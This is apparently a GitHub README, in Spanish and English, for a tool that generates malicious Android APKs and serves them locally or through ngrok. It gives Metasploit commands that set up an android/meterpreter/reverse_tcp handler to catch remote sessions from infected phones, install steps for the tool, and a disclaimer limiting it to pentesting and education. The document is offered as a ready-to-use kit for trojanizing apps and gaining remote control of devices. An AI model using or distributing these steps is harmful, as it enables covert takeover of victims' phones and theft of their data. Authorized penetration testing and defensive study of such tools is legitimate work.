# MSF-Android

Generador de APK's maliciosas para Android | local y remoto.

![msf_android](https://user-images.githubusercontent.com/75953873/156858658-57b6bb3f-e399-473f-a673-e83e8573b29b.png)

## 📷 SCREENSHOTS 

### Instalando NGROK:
![download_ngrok](https://user-images.githubusercontent.com/75953873/156858687-ddee2244-982a-4cd7-bff3-d7a0ea9e19f4.png)


### Creando APK:
![ngrok](https://user-images.githubusercontent.com/75953873/156858797-e04b002a-aa7a-45d5-bdab-2a59b076a56a.png)


### Obteniendo enlace **`LOCAL`** && **`REMOTO`**:
![downloadAPK](https://user-images.githubusercontent.com/75953873/156858874-aa842762-05d0-4d7b-831f-18f534e8ecda.png)

### Obteniendo una sesión meterpreter
![exploit](https://user-images.githubusercontent.com/75953873/156859040-6a96a969-cbeb-448e-ab64-07c36780a91b.png)

##### Abrimos una nueva terminal y ejecutamos:
```
> msfconsole
> use exploit/multi/handler
> set payload android/meterpreter/reverse_tcp
> set LHOST 0.0.0.0
> run
```
![exploit_2](https://user-images.githubusercontent.com/75953873/156859055-666a76c4-d74b-48e4-a262-4f95f6dcebd6.png)


## Instalación / Installation

```
• git clone https://github.com/R3LI4NT/MSF-Android
• cd MSF-Android
• sudo python3 msfandroid.py
```


### Importante

**`ES:`** No me hago responsable del mal uso que se le pueda dar a esta herramienta, úselo para Pentesting o fines educativos.

**`EN:`**  I am not responsible for the misuse that may be given to this tool, use it for Pentesting or educational purposes.
